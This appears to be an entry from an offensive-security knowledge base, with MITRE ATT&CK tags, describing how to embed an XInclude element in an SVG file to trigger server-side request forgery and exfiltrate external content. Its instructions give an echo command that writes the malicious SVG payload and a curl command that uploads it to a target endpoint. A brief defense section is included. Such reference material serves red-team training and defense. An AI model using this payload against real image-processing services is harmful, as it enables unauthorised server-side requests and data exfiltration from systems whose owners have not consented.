---
tags:
  - xinclude
  - ssrf
type: procedure
tools:
  - '[[tools/ImageMagick]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/incorporate-xinclude]]'
  - '[[commands/upload-svg-payload]]'
platforms:
  - Web
  - Windows
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: de579209-4923-4682-a535-65c46bd320a1
created_at: '2025-12-13T09:00:28.101Z'
updated_at: '2025-12-13T09:00:28.101Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Use XIncludes for Data Inclusion

## Summary

This procedure uses XIncludes in SVG to reliably include external text content, providing an alternative to XXE for data exfiltration.

## Description

XIncludes allow direct referencing of external URLs, bypassing some XXE limitations and enabling SSRF-like behavior during SVG processing.

## Requirements

1. Target supports XInclude parsing
2. External URLs accessible from server
3. SVG creation tools

## Defense

Defensive measures and detection strategies:

- Disable XInclude support in XML processors
- Validate and restrict external references

## Objectives

1. Include external HTTP responses in SVG
2. Achieve reliable exfiltration
3. Render included data

## Instructions

### Step 1: Add XInclude to SVG

**Context**: Incorporate XInclude in text element.

**Command** ([[commands/incorporate-xinclude]]):
```bash
echo '<text x="10" y="10"> <xi:include href="https://www.google.com/" parse="text"/> </text>' > malicious.svg
```

> Includes external content as text.

### Step 2: Upload SVG

**Context**: Submit for processing.

**Command** ([[commands/upload-svg-payload]]):
```bash
curl -X POST -F 'file=@malicious.svg' https://emblem-editor-endpoint
```

> Triggers inclusion and rendering.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/incorporate-xinclude]]
- [[commands/upload-svg-payload]]

## Tools Used

- [[tools/ImageMagick]]

## Tags

- [[xinclude]]
- [[ssrf]]
